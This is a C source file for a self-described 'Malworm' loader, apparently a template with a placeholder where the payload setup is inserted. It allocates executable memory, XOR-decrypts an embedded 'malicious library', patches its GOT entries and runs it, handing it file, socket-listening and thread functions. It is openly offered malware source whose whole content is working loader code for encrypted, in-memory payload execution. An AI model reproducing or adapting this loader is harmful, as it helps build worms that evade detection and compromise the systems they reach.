#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>   // For sysconf
#include <dlfcn.h>    // For dlsym

#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <pthread.h>

#include "./globals.h"


void xor_memory(void * memory, size_t len, char*key);


// Function pointer type for the embedded function
typedef void (*MaLibEntry)(Globals *);

void setup_library(MaLib **libp){
    <lib_setup>
}


/// initialize pointers to the functions listed in struct globals (globals.h)
void init_globals(Globals *global){
    global->exit=&exit;

    // strings
    global->getcwd=&getcwd;
    global->snprintf=&snprintf;
    global->fprintf=&fprintf;
    global->strlen=&strlen;

    // memory
    global->memcpy = &memcpy;

    // files
    global->realpath=&realpath;
    global->fopen=&fopen;
    global->fread=&fread;
    global->fseek=&fseek;
    global->ftell=&ftell;
    global->fclose=&fclose;
    global->rewind=&rewind;
    global->write=&write;
    global->close=&close;

    // heap
    global->malloc=&malloc;
    global->free=&free;

    // network
    global->htonl=&htonl;
    global->htons=&htons;
    global->socket=&socket;
    global->setsockopt=&setsockopt;
    global->bind=&bind;
    global->listen=&listen;
    global->accept=&accept;
    
    // threads
    global->pthread_create=&pthread_create;
    global->pthread_exit=&pthread_exit;

    // fds
    global->stdout = stdout;
    global->stderr = stderr;

    // misc
    global->rand = &rand;

    // custom functions
    global->xor_memory = &xor_memory;
}

/// execute the code from a malicious library
void exec_malib(Globals *global, void*mem, uint64_t entry_offset, size_t mem_size){
    MaLibEntry lib_entry = (MaLibEntry)mem + entry_offset;
    lib_entry(global);
    munmap(mem, mem_size);
}

// xor a memory region with the given key
void xor_memory(void * memory, size_t len, char*key){
    unsigned char* tmp = (unsigned char*) memory;
    size_t keylen = 8*sizeof(char);
    for(int i=0;i<len;i++){
        char k = (char)key[i%keylen];
        //fprintf(stdout, "decrypt with char 0x%#02x\n", k);
        tmp[i] ^= key[i % keylen];
    }
}

/// load a malicious library into memory and decrypt it
void * load_library(MaLib *lib){
    // Allocate memory for the executable code
    void *lib_mem = mmap(NULL, lib->data_length, PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (lib_mem == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    // Copy the byte array to the executable memory
    memcpy(lib_mem, lib->data, lib->data_length);
    xor_memory(lib_mem, lib->data_length, (char *)&lib->key);

    // link got
    //fprintf(stdout, "lib_mem at %p\n", lib_mem);
    //fprintf(stdout, "Number of got_offsets: %d\n", lib->n_got_mappings);
    for(size_t i = 0; i < lib->n_got_mappings; i++){
        //fprintf(stdout, "Update GOT entry at %p from %lx to %lx\n", lib_mem+lib->got_offsets[i], *(uint64_t *)(lib_mem+lib->got_offsets[i]), (uint64_t) lib_mem + lib->got_targets[i]);
        *(uint64_t *)(lib_mem+lib->got_offsets[i]) = (uint64_t) lib_mem + lib->got_targets[i];
    }

    return lib_mem;
}

/// load all malicious libraries into memory and execute them
void load_libraries(Globals *global){
    MaLib *lib = malloc(sizeof(MaLib));

    // TODO: error handling
    setup_library(&lib);

    fprintf(stdout, "🔑🔒🔑🔒🔑    0x%lx     🔑🔒🔑🔒🔑\n", lib->key);

    // load the library
    void* lib_mem = load_library(lib);
    global->lib_mem = lib_mem;
    global->lib = lib;
    
    // run the library code (entry)
    fprintf(stdout, "🦠🪱🐛🪱🐉 Malworm ready to eat you! 🐉🪱🐛🪱🦠\n");
    exec_malib(global, lib_mem, lib->entry_offset, lib->data_length);

    // free the library
    free(lib);
}


int main(int argc, char**argv) {
    // setup global variables and functions
    Globals *global = (Globals *) malloc(sizeof(Globals));
    init_globals(global);

    // add a reference to the executable of the malworm to the struct globals
    global->exec_path = argv[0];

    // load and execute all provided malware-libraries
    load_libraries(global);
    return 0;
}
